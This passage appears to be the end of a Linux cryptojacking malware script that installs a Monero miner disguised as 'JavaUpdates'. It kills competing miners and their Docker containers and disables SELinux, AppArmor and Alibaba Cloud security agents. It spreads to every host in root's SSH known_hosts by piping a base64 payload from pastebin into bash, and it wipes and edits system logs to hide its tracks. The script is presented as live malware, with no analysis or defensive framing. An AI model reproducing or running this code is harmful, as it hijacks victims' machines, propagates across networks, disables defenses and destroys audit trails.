	pgrep -f kseriod_svc | xargs -I % kill -9 %
	pgrep -f kthreadd_svc | xargs -I % kill -9 %
	pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
	pgrep -f kintegrityd_svc | xargs -I % kill -9 %
	pgrep -f jawa | xargs -I % kill -9 %
	pgrep -f oracle.jpg | xargs -I % kill -9 %
	pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % kill -9 %
	pgrep -f 188.209.49.54 | xargs -I % kill -9 %
	pgrep -f 181.214.87.241 | xargs -I % kill -9 %
	pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % kill -9 %
	pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % kill -9 %
	pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % kill -9 %
	pgrep -f servim | xargs -I % kill -9 %
	pgrep -f kblockd_svc | xargs -I % kill -9 %
	pgrep -f native_svc | xargs -I % kill -9 %
	pgrep -f ynn | xargs -I % kill -9 %
	pgrep -f 65ccEJ7 | xargs -I % kill -9 %
	pgrep -f jmxx | xargs -I % kill -9 %
	pgrep -f 2Ne80nA | xargs -I % kill -9 %
	pgrep -f sysstats | xargs -I % kill -9 %
	pgrep -f systemxlv | xargs -I % kill -9 %
	pgrep -f watchbog | xargs -I % kill -9 %
	pgrep -f OIcJi1m | xargs -I % kill -9 %
	pkill -f biosetjenkins
	pkill -f Loopback
	pkill -f apaceha
	pkill -f cryptonight
	pkill -f stratum
	pkill -f mixnerdx
	pkill -f performedl
	pkill -f JnKihGjn
	pkill -f irqba2anc1
	pkill -f irqba5xnc1
	pkill -f irqbnc1
	pkill -f ir29xc1
	pkill -f conns
	pkill -f irqbalance
	pkill -f crypto-pool
	pkill -f XJnRj
	pkill -f mgwsl
	pkill -f pythno
	pkill -f jweri
	pkill -f lx26
	pkill -f NXLAi
	pkill -f BI5zj
	pkill -f askdljlqw
	pkill -f minerd
	pkill -f minergate
	pkill -f Guard.sh
	pkill -f ysaydh
	pkill -f bonns
	pkill -f donns
	pkill -f kxjd
	pkill -f Duck.sh
	pkill -f bonn.sh
	pkill -f conn.sh
	pkill -f kworker34
	pkill -f kw.sh
	pkill -f pro.sh
	pkill -f polkitd
	pkill -f acpid
	pkill -f icb5o
	pkill -f nopxi
	pkill -f irqbalanc1
	pkill -f minerd
	pkill -f i586
	pkill -f gddr
	pkill -f mstxmr
	pkill -f ddg.2011
	pkill -f wnTKYg
	pkill -f deamon
	pkill -f disk_genius
	pkill -f sourplum
	pkill -f polkitd
	pkill -f nanoWatch
	pkill -f zigw
	pkill -f devtool
	pkill -f devtools
	pkill -f systemctI
	pkill -f watchbog
	pkill -f cryptonight
	pkill -f sustes
	pkill -f xmrig
	pkill -f xmrig-cpu
	pkill -f 121.42.151.137
	pkill -f init12.cfg
	pkill -f nginxk
	pkill -f tmp/wc.conf
	pkill -f xmrig-notls
	pkill -f xmr-stak
	pkill -f suppoie
	pkill -f zer0day.ru
	pkill -f dbus-daemon--system
	pkill -f nullcrew
	pkill -f systemctI
	pkill -f kworkerds
	pkill -f init10.cfg
	pkill -f /wl.conf
	pkill -f crond64
	pkill -f sustse
	pkill -f vmlinuz
	pkill -f exin
	pkill -f apachiii
	pkill -f networkservics
	rm -rf /usr/bin/config.json
	rm -rf /usr/bin/exin
	rm -rf /tmp/wc.conf
	rm -rf /tmp/log_rot
	rm -rf /tmp/apachiii
	rm -rf /tmp/sustse
	rm -rf /tmp/php
	rm -rf /tmp/p2.conf
	rm -rf /tmp/pprt
	rm -rf /tmp/ppol
	rm -rf /tmp/javax/config.sh
	rm -rf /tmp/javax/sshd2
	rm -rf /tmp/.profile
	rm -rf /tmp/1.so
	rm -rf /tmp/kworkerds
	rm -rf /tmp/kworkerds3
	rm -rf /tmp/kworkerdssx
	rm -rf /tmp/xd.json
	rm -rf /tmp/syslogd
	rm -rf /tmp/syslogdb
	rm -rf /tmp/65ccEJ7
	rm -rf /tmp/jmxx
	rm -rf /tmp/2Ne80nA
	rm -rf /tmp/dl
	rm -rf /tmp/ddg
	rm -rf /tmp/systemxlv
	rm -rf /tmp/systemctI
	rm -rf /tmp/.abc
	rm -rf /tmp/osw.hb
	rm -rf /tmp/.tmpleve
	rm -rf /tmp/.tmpnewzz
	rm -rf /tmp/.java
	rm -rf /tmp/.omed
	rm -rf /tmp/.tmpc
	rm -rf /tmp/.tmpleve
	rm -rf /tmp/.tmpnewzz
	rm -rf /tmp/gates.lod
	rm -rf /tmp/conf.n
	rm -rf /tmp/devtool
	rm -rf /tmp/devtools
	rm -rf /tmp/fs
	rm -rf /tmp/.rod
	rm -rf /tmp/.rod.tgz
	rm -rf /tmp/.rod.tgz.1
	rm -rf /tmp/.rod.tgz.2
	rm -rf /tmp/.mer
	rm -rf /tmp/.mer.tgz
	rm -rf /tmp/.mer.tgz.1
	rm -rf /tmp/.hod
	rm -rf /tmp/.hod.tgz
	rm -rf /tmp/.hod.tgz.1
	rm -rf /tmp/84Onmce
	rm -rf /tmp/C4iLM4L
	rm -rf /tmp/lilpip
	rm -rf /tmp/3lmigMo
	rm -rf /tmp/am8jmBP
	rm -rf /tmp/tmp.txt
	rm -rf /tmp/baby
	rm -rf /tmp/.lib
	rm -rf /tmp/systemd
	rm -rf /tmp/lib.tar.gz
	rm -rf /tmp/baby
	rm -rf /tmp/java
	rm -rf /tmp/j2.conf
	rm -rf /tmp/.mynews1234
	rm -rf /tmp/a3e12d
	rm -rf /tmp/.pt
	rm -rf /tmp/.pt.tgz
	rm -rf /tmp/.pt.tgz.1
	rm -rf /tmp/go
	rm -rf /tmp/java
	rm -rf /tmp/j2.conf
	rm -rf /tmp/.tmpnewasss
	rm -rf /tmp/java
	rm -rf /tmp/go.sh
	rm -rf /tmp/go2.sh
	rm -rf /tmp/khugepageds
	rm -rf /tmp/.censusqqqqqqqqq
	rm -rf /tmp/.kerberods
	rm -rf /tmp/kerberods
	rm -rf /tmp/seasame
	rm -rf /tmp/touch
	rm -rf /tmp/.p
	rm -rf /tmp/runtime2.sh
	rm -rf /tmp/runtime.sh
	rm -rf /dev/shm/z3.sh
	rm -rf /dev/shm/z2.sh
	rm -rf /dev/shm/.scr
	rm -rf /dev/shm/.kerberods
	rm -f /etc/ld.so.preload
	rm -f /usr/local/lib/libioset.so
	chattr -i /etc/ld.so.preload
	rm -f /etc/ld.so.preload
	rm -f /usr/local/lib/libioset.so
	rm -rf /tmp/watchdogs
	rm -rf /etc/cron.d/tomcat
	rm -rf /etc/rc.d/init.d/watchdogs
	rm -rf /usr/sbin/watchdogs
	rm -f /tmp/kthrotlds
	rm -f /etc/rc.d/init.d/kthrotlds
	rm -rf /tmp/.sysbabyuuuuu12
	rm -rf /tmp/logo9.jpg
	rm -rf /tmp/miner.sh
	rm -rf /tmp/nullcrew
	rm -rf /tmp/proc
	rm -rf /tmp/2.sh
	rm /opt/atlassian/confluence/bin/1.sh
	rm /opt/atlassian/confluence/bin/1.sh.1
	rm /opt/atlassian/confluence/bin/1.sh.2
	rm /opt/atlassian/confluence/bin/1.sh.3
	rm /opt/atlassian/confluence/bin/3.sh
	rm /opt/atlassian/confluence/bin/3.sh.1
	rm /opt/atlassian/confluence/bin/3.sh.2
	rm /opt/atlassian/confluence/bin/3.sh.3
	rm -rf /var/tmp/f41
	rm -rf /var/tmp/2.sh
	rm -rf /var/tmp/config.json
	rm -rf /var/tmp/xmrig
	rm -rf /var/tmp/1.so
	rm -rf /var/tmp/kworkerds3
	rm -rf /var/tmp/kworkerdssx
	rm -rf /var/tmp/kworkerds
	rm -rf /var/tmp/wc.conf
	rm -rf /var/tmp/nadezhda.
	rm -rf /var/tmp/nadezhda.arm
	rm -rf /var/tmp/nadezhda.arm.1
	rm -rf /var/tmp/nadezhda.arm.2
	rm -rf /var/tmp/nadezhda.x86_64
	rm -rf /var/tmp/nadezhda.x86_64.1
	rm -rf /var/tmp/nadezhda.x86_64.2
	rm -rf /var/tmp/sustse3
	rm -rf /var/tmp/sustse
	rm -rf /var/tmp/moneroocean/
	rm -rf /var/tmp/devtool
	rm -rf /var/tmp/devtools
	rm -rf /var/tmp/play.sh
	rm -rf /var/tmp/systemctI
	rm -rf /var/tmp/.java
	rm -rf /var/tmp/1.sh
	rm -rf /var/tmp/conf.n
	rm -r /var/tmp/lib
	rm -r /var/tmp/.lib
	chattr -iau /tmp/lok
	chmod 700 /tmp/lok
	rm -rf /tmp/lok
	sleep 1
	chattr -i /tmp/kdevtmpfsi
	echo 1 > /tmp/kdevtmpfsi
	chattr +i /tmp/kdevtmpfsi
	sleep 1
	chattr -i /tmp/redis2
	echo 1 > /tmp/redis2
	chattr +i /tmp/redis2
	sleep 1
	chattr -i /usr/lib/systemd/systemd-update-daily
	echo 1 > /usr/lib/systemd/systemd-update-daily
	chattr +i /usr/lib/systemd/systemd-update-daily
	#yum install -y docker.io || apt-get install docker.io;
	docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker kill %
	docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker kill %
	docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker kill %
	docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker kill %
	docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker kill %
	docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker kill %
	docker ps | grep "monero" | awk '{print $1}' | xargs -I % docker kill %
	docker ps | grep "slowhttp" | awk '{print $1}' | xargs -I % docker kill %
	docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker kill %
	docker ps | grep "entrypoint.sh" | awk '{print $1}' | xargs -I % docker kill %
	docker ps | grep "/var/sbin/bash" | awk '{print $1}' | xargs -I % docker kill %
	docker images -a | grep "pocosow" | awk '{print $3}' | xargs -I % docker rmi -f %
	docker images -a | grep "gakeaws" | awk '{print $3}' | xargs -I % docker rmi -f %
	docker images -a | grep "buster-slim" | awk '{print $3}' | xargs -I % docker rmi -f %
	docker images -a | grep "hello-" | awk '{print $3}' | xargs -I % docker rmi -f %
	docker images -a | grep "azulu" | awk '{print $3}' | xargs -I % docker rmi -f %
	docker images -a | grep "registry" | awk '{print $3}' | xargs -I % docker rmi -f %
	docker images -a | grep "xmr" | awk '{print $3}' | xargs -I % docker rmi -f %
	docker images -a | grep "auto" | awk '{print $3}' | xargs -I % docker rmi -f %
	docker images -a | grep "mine" | awk '{print $3}' | xargs -I % docker rmi -f %
	docker images -a | grep "monero" | awk '{print $3}' | xargs -I % docker rmi -f %
	docker images -a | grep "slowhttp" | awk '{print $3}' | xargs -I % docker rmi -f %
	echo SELINUX=disabled >/etc/selinux/config
	service apparmor stop
	systemctl disable apparmor
	service aliyun.service stop
	systemctl disable aliyun.service
	ps aux | grep -v grep | grep 'aegis' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
}

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "JavaUpdates"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "JavaUpdates"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}

if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
	for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL https://pastebin.com/raw/UhUmR517||wget -q -O - https://pastebin.com/raw/UhUmR517)|base64 -d|bash >/dev/null 2>&1 &' & done
fi

kill_miner_proc
kill_sus_proc

function upgradeday() 
{
	if [ "$me" != "root" ];then
		bug_path="/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/"
	else
		bug_path="/bin/"
	fi
	if [ -f "$bug_path/JavaUpdates" ]; then
		cd $bug_path		
		$check_type=$(./JavaUpdates -V|grep 'xmr-stak'|wc -l)
		if [ ${check_type} -ne 0 ];then
			$check_type_b=$(./JavaUpdates -V|grep '1.0.4-rx'|wc -l)
			if [ ${check_type_b} -eq 0 ];then
				cleanoldpack
			fi
		else
			$check_type_a=$(./JavaUpdates -V|grep 'XMRig'|wc -l)
			if [ ${check_type_a} -ne 0 ];then
				$check_type_b=$(./JavaUpdates -V|grep '5.3.0'|wc -l)
				if [ ${check_type_b} -eq 0 ];then
					cleanoldpack
				fi
			else
				cleanoldpack
			fi
		fi
	else
		cleanoldpack
	fi
}

if [ "$me" != "root" ];then
	pz=$(ps -fe|grep 'JavaUpdates'|grep -v grep|wc -l)
	if [ ${pz} -ne 0 ];then
		crontab -r
		cronlow
	else
		download
		crontab -r
		cronlow
		sleep 15
		pm=$(ps -fe|grep 'JavaUpdates'|grep -v grep|wc -l)
		if [ ${pm} -eq 0 ];then
			testa
		fi
		prt=$(ps -fe|grep 'JavaUpdates'|grep -v grep|wc -l)
		if [ ${prt} -ne 0 ];then
			if [ ! -f "/tmp/.tmpc" ]; then
				finished "$deep"
			fi
		fi
	fi
else
	pz=$(ps -fe|grep 'JavaUpdates'|grep -v grep|wc -l)
	if [ ${pz} -ne 0 ];then
		system
		cronhigh
	else
		system
		cronhigh
		download
		sleep 15
		pm=$(ps -fe|grep 'JavaUpdates'|grep -v grep|wc -l)
		if [ ${pm} -ne 0 ];then
			if [ ! -f "/tmp/.tmpc" ]; then
				finished "$surf"
			fi
		fi
		sleep 30
		if [ ${pm} -eq 0 ];then
			testa
			if [ ${pm} -ne 0 ];then
				finished "$surf"
			fi
		fi
		if [ ${pm} -eq 0 ];then
			download
			if [ ${pm} -ne 0 ];then
				finished "$deep"
			fi
		fi
		if [ ${pm} -eq 0 ];then
			testa
			if [ ${pm} -ne 0 ];then
				finished "$deep"
			fi
		fi
	fi
	echo 0>/var/log/secure
	echo 0>/var/log/cron
	sed -i '/pastebin/d' /var/log/syslog
	sed -i '/github/d' /var/log/syslog
fi
#
cronbackup
#
cronrc
#
px=$(ps -fe|grep 'JavaUpdates'|grep -v grep|wc -l)
if [ ${px} -gt 1 ];then
ps auxf|grep -v grep|grep "JavaUpdates" | awk '{print $2}'|xargs kill -9
fi
#